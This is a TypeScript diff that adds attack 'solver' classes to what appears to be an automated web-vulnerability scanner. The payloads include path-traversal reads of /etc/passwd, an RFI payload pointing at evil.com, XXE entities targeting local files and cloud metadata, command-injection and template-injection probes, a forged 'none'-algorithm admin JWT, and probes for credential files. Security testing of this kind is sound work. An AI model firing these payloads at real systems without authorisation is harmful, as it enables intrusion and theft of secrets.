@@ -399,6 +399,319 @@ class OpenRedirectSolver extends BaseSolver {
   }
 }
 
+class LFISolver extends BaseSolver {
+  private readonly payloads = [
+    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
+    "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
+    "..%2Fetc%2Fpasswd", "..%252Fetc%252Fpasswd",
+    "/etc/passwd%00", "php://filter/convert.base64-encode/resource=index.php",
+  ];
+
+  async solve(task: SolverTask): Promise<SolverResult> {
+    const start = Date.now();
+    let found = false;
+    let bestPayload = "";
+    let bestResp = "";
+    const params = ["file", "page", "include", "path", "template", "doc", "filename"];
+
+    for (const payload of this.payloads) {
+      for (const param of params) {
+        const resp = await this.httpProbe(`${task.endpoint}?${param}=${encodeURIComponent(payload)}`);
+        if (resp.body.match(/root:.*:0:0:/) || resp.body.includes("bin/bash")) {
+          found = true; bestPayload = payload; bestResp = resp.body.slice(0, 300); break;
+        }
+        if (payload.includes("base64") && resp.body.match(/^[A-Za-z0-9+/=]{40,}$/m)) {
+          found = true; bestPayload = `php://filter detected via ${param}`; bestResp = resp.body.slice(0, 200); break;
+        }
+      }
+      if (found) break;
+    }
+
+    return {
+      taskId: task.id, solverId: `lfi-solver-${uuidv4().slice(0, 8)}`,
+      endpoint: task.endpoint, vulnClass: "lfi", found,
+      confidence: found ? 0.9 : 0.05, evidence: { payloadsTested: this.payloads.length * params.length },
+      payload: bestPayload, request: found ? `${task.endpoint}?file=${encodeURIComponent(bestPayload)}` : "",
+      response: bestResp, duration: Date.now() - start, toolsUsed: ["http_probe", "lfi_payload_library"],
+    };
+  }
+}
+
+class RFISolver extends BaseSolver {
+  async solve(task: SolverTask): Promise<SolverResult> {
+    const start = Date.now();
+    let found = false;
+    let evidence = "";
+    const rfiPayload = "http://evil.com/shell.txt";
+    const params = ["file", "page", "include", "url", "path", "template"];
+
+    for (const param of params) {
+      const resp = await this.httpProbe(`${task.endpoint}?${param}=${encodeURIComponent(rfiPayload)}`);
+      // RFI if server attempted to fetch the URL (often shows connection refused or timeout to attacker domain)
+      if (resp.body.includes("evil.com") || resp.status === 0) {
+        found = true;
+        evidence = `Param '${param}' may include remote URLs`;
+        break;
+      }
+    }
+
+    return {
+      taskId: task.id, solverId: `rfi-solver-${uuidv4().slice(0, 8)}`,
+      endpoint: task.endpoint, vulnClass: "rfi", found,
+      confidence: found ? 0.7 : 0.05, evidence: { detail: evidence },
+      payload: rfiPayload, request: task.endpoint, response: evidence,
+      duration: Date.now() - start, toolsUsed: ["http_probe"],
+    };
+  }
+}
+
+class XXESolver extends BaseSolver {
+  private readonly xxePayloads = [
+    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
+    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
+    `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hostname">]><data>&file;</data>`,
+  ];
+
+  async solve(task: SolverTask): Promise<SolverResult> {
+    const start = Date.now();
+    let found = false;
+    let bestPayload = "";
+    let bestResp = "";
+
+    for (const payload of this.xxePayloads) {
+      const resp = await this.httpProbe(task.endpoint, "POST", undefined, {
+        "Content-Type": "application/xml",
+        "Accept": "application/xml, text/xml, */*",
+      }, payload);
+      if (resp.body.match(/root:.*:0:0:/) || resp.body.includes("ami-id") || resp.body.includes("hostname")) {
+        found = true; bestPayload = payload; bestResp = resp.body.slice(0, 500); break;
+      }
+    }
+
+    return {
+      taskId: task.id, solverId: `xxe-solver-${uuidv4().slice(0, 8)}`,
+      endpoint: task.endpoint, vulnClass: "xxe", found,
+      confidence: found ? 0.92 : 0.05, evidence: { payloadsTested: this.xxePayloads.length },
+      payload: bestPayload, request: task.endpoint, response: bestResp,
+      duration: Date.now() - start, toolsUsed: ["http_probe", "xxe_payload_library"],
+    };
+  }
+}
+
+class CORSSolver extends BaseSolver {
+  private readonly testOrigins = [
+    "https://evil.com", "null", "https://attacker.com",
+    "https://trusted.evil.com", "http://localhost",
+  ];
+
+  async solve(task: SolverTask): Promise<SolverResult> {
+    const start = Date.now();
+    let found = false;
+    let bestOrigin = "";
+    let evidence = "";
+
+    for (const origin of this.testOrigins) {
+      const resp = await this.httpProbe(task.endpoint, "GET", undefined, { "Origin": origin });
+      const acao = resp.headers["access-control-allow-origin"] || "";
+      const acac = resp.headers["access-control-allow-credentials"] || "";
+      if (acao === origin || (acao === origin && acac === "true")) {
+        found = true; bestOrigin = origin;
+        evidence = `ACAO: ${acao}, ACAC: ${acac}`;
+        break;
+      }
+    }
+
+    return {
+      taskId: task.id, solverId: `cors-solver-${uuidv4().slice(0, 8)}`,
+      endpoint: task.endpoint, vulnClass: "cors", found,
+      confidence: found ? 0.85 : 0.05, evidence: { originsChecked: this.testOrigins.length, detail: evidence },
+      payload: bestOrigin, request: `${task.endpoint} [Origin: ${bestOrigin}]`, response: evidence,
+      duration: Date.now() - start, toolsUsed: ["http_probe", "cors_origin_testing"],
+    };
+  }
+}
+
+class CSRFSolver extends BaseSolver {
+  async solve(task: SolverTask): Promise<SolverResult> {
+    const start = Date.now();
+    let found = false;
+    const leaks: Record<string, unknown> = {};
+
+    for (const method of ["POST", "PUT", "PATCH", "DELETE"]) {
+      const resp = await this.httpProbe(task.endpoint, method, undefined, {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": "https://evil.com",
+      }, "action=test&value=csrf_probe");
+
+      const hasToken = resp.body.toLowerCase().includes("csrf") || resp.body.includes("_token");
+      const noSameSite = !(resp.headers["set-cookie"] || "").toLowerCase().includes("samesite");
+
+      if (!hasToken && resp.status < 400 && noSameSite) {
+        found = true;
+        leaks[method] = { status: resp.status, missingCSRFToken: true, noSameSite };
+      }
+    }
+
+    return {
+      taskId: task.id, solverId: `csrf-solver-${uuidv4().slice(0, 8)}`,
+      endpoint: task.endpoint, vulnClass: "csrf", found,
+      confidence: found ? 0.75 : 0.1, evidence: leaks,
+      payload: "Cross-origin state-changing request without CSRF token",
+      request: task.endpoint, response: JSON.stringify(leaks).slice(0, 500),
+      duration: Date.now() - start, toolsUsed: ["http_probe", "csrf_detection"],
+    };
+  }
+}
+
+class AuthBypassSolver extends BaseSolver {
+  private readonly bypassHeaders = [
+    { "X-Original-URL": "/admin" },
+    { "X-Forwarded-For": "127.0.0.1" },
+    { "X-Remote-IP": "127.0.0.1" },
+    { "X-Client-IP": "127.0.0.1" },
+    { "X-Real-IP": "127.0.0.1" },
+  ];
+
+  async solve(task: SolverTask): Promise<SolverResult> {
+    const start = Date.now();
+    let found = false;
+    let bypassHeader: Record<string, string> = {};
+    let evidence = "";
+
+    const baseline = await this.httpProbe(task.endpoint);
+    const baseStatus = baseline.status;
+
+    for (const headers of this.bypassHeaders) {
+      const resp = await this.httpProbe(task.endpoint, "GET", undefined, headers);
+      if ((baseStatus === 401 || baseStatus === 403) && resp.status === 200) {
+        found = true; bypassHeader = headers;
+        evidence = `Bypass via ${JSON.stringify(headers)}: ${baseStatus}→${resp.status}`;
+        break;
+      }
+    }
+
+    if (!found) {
+      const noneJwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.";
+      const resp = await this.httpProbe(task.endpoint, "GET", undefined, { "Authorization": `Bearer ${noneJwt}` });
+      if (resp.status === 200 && baseStatus !== 200) {
+        found = true; evidence = "JWT 'none' algorithm accepted";
+      }
+    }
+
+    return {
+      taskId: task.id, solverId: `authbypass-solver-${uuidv4().slice(0, 8)}`,
+      endpoint: task.endpoint, vulnClass: "auth_bypass", found,
+      confidence: found ? 0.88 : 0.05, evidence: { detail: evidence, baselineStatus: baseStatus },
+      payload: JSON.stringify(bypassHeader), request: task.endpoint, response: evidence,
+      duration: Date.now() - start, toolsUsed: ["http_probe", "header_injection", "jwt_testing"],
+    };
+  }
+}
+
+class MisconfigSolver extends BaseSolver {
+  private readonly sensitiveFiles = [
+    "/.env", "/.git/config", "/config.json", "/wp-config.php",
+    "/phpinfo.php", "/.htaccess", "/web.config", "/Dockerfile",
+    "/docker-compose.yml", "/.aws/credentials", "/backup.sql",
+    "/config/database.yml", "/server-status",
+  ];
+
+  async solve(task: SolverTask): Promise<SolverResult> {
+    const start = Date.now();
+    const exposedFiles: string[] = [];
+    const base = (() => { try { return new URL(task.endpoint).origin; } catch { return task.endpoint; } })();
+
+    for (const path of this.sensitiveFiles) {
+      const resp = await this.httpProbe(`${base}${path}`);
+      if (resp.status === 200 && resp.body.length > 50) {
+        const isSensitive = resp.body.includes("DB_") || resp.body.includes("password") ||
+          resp.body.includes("[core]") || resp.body.includes("<?php") ||
+          resp.body.includes("ServerRoot") || resp.body.includes("DOCUMENT_ROOT");
+        if (isSensitive) exposedFiles.push(path);
+      }
+    }
+
+    const found = exposedFiles.length > 0;
+    return {
+      taskId: task.id, solverId: `misconfig-solver-${uuidv4().slice(0, 8)}`,
+      endpoint: task.endpoint, vulnClass: "misconfig", found,
+      confidence: found ? 0.92 : 0.05,
+      evidence: { exposedFiles, testedPaths: this.sensitiveFiles.length },
+      payload: exposedFiles.join(", "),
+      request: exposedFiles.map(f => `${base}${f}`).join("\n"),
+      response: found ? `Exposed: ${exposedFiles.join(", ")}` : "None found",
+      duration: Date.now() - start, toolsUsed: ["http_probe", "sensitive_file_discovery"],
+    };
+  }
+}
+
+class RCESolver extends BaseSolver {
+  private readonly probes = [
+    { payload: "; id", pattern: /uid=\d+.*gid=\d+/ },
+    { payload: "| id", pattern: /uid=\d+.*gid=\d+/ },
+    { payload: "`id`", pattern: /uid=\d+.*gid=\d+/ },
+    { payload: "$(id)", pattern: /uid=\d+.*gid=\d+/ },
+    { payload: "{{7*7}}", pattern: /49/ },
+    { payload: "${7*7}", pattern: /49/ },
+    { payload: "<%=7*7%>", pattern: /49/ },
+  ];
+
+  async solve(task: SolverTask): Promise<SolverResult> {
+    const start = Date.now();
+    let found = false;
+    let bestPayload = "";
+    let bestResp = "";
+    const params = ["cmd", "exec", "command", "run", "ping", "host", "q", "query", "input"];
+
+    for (const probe of this.probes) {
+      for (const param of params) {
+        const resp = await this.httpProbe(`${task.endpoint}?${param}=${encodeURIComponent(probe.payload)}`);
+        if (probe.pattern.test(resp.body)) {
+          found = true; bestPayload = probe.payload; bestResp = resp.body.slice(0, 500); break;
+        }
+      }
+      if (found) break;
+    }
+
+    return {
+      taskId: task.id, solverId: `rce-solver-${uuidv4().slice(0, 8)}`,
+      endpoint: task.endpoint, vulnClass: "rce", found,
+      confidence: found ? 0.95 : 0.05, evidence: { probesTested: this.probes.length * params.length },
+      payload: bestPayload, request: found ? `${task.endpoint}?cmd=${encodeURIComponent(bestPayload)}` : "",
+      response: bestResp, duration: Date.now() - start, toolsUsed: ["http_probe", "rce_payload_library"],
+    };
+  }
+}
+
+class InfoDisclosureSolver extends BaseSolver {
+  async solve(task: SolverTask): Promise<SolverResult> {
+    const start = Date.now();
+    const leaks: string[] = [];
+    const resp = await this.httpProbe(task.endpoint);
+    const body = resp.body;
+
+    if (/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(body)) leaks.push("email addresses");
+    if (/-----BEGIN (RSA |EC )?PRIVATE KEY-----/.test(body)) leaks.push("private keys");
+    if (/AKIA[0-9A-Z]{16}/.test(body)) leaks.push("AWS access keys");
+    if (/"password"\s*:\s*"[^"]+"/.test(body)) leaks.push("plaintext passwords");
+    if (/stack trace|at \w+\.\w+\(\w+\.java:\d+\)|Traceback/i.test(body)) leaks.push("stack traces");
+    if (/SQL syntax|mysql_fetch|ORA-\d+|pg_query/i.test(body)) leaks.push("database errors");
+
+    const serverHeader = resp.headers["server"] || "";
+    if (/Apache\/[\d.]+|nginx\/[\d.]+|IIS\/[\d.]+/.test(serverHeader)) leaks.push(`version: ${serverHeader}`);
+    if (resp.headers["x-powered-by"]) leaks.push(`x-powered-by: ${resp.headers["x-powered-by"]}`);
+
+    const found = leaks.length > 0;
+    return {
+      taskId: task.id, solverId: `infodisclosure-solver-${uuidv4().slice(0, 8)}`,
+      endpoint: task.endpoint, vulnClass: "info_disclosure", found,
+      confidence: found ? 0.8 : 0.05, evidence: { leaks },
+      payload: leaks.join(", "), request: task.endpoint, response: body.slice(0, 500),
+      duration: Date.now() - start, toolsUsed: ["http_probe", "pattern_matching"],
+    };
+  }
+}
+
 // Solver registry
 const SOLVER_REGISTRY: Partial<Record<VulnClass, new () => BaseSolver>> = {
   xss: XSSSolver,
@@ -406,6 +719,15 @@ const SOLVER_REGISTRY: Partial<Record<VulnClass, new () => BaseSolver>> = {
   ssrf: SSRFSolver,
   idor: IDORSolver,
   open_redirect: OpenRedirectSolver,
+  lfi: LFISolver,
+  rfi: RFISolver,
+  xxe: XXESolver,
+  cors: CORSSolver,
+  csrf: CSRFSolver,
+  auth_bypass: AuthBypassSolver,
+  misconfig: MisconfigSolver,
+  rce: RCESolver,
+  info_disclosure: InfoDisclosureSolver,
 };
 
 // ─── Strategy Coordinator (Single Brain) ──────────────────────────────────────
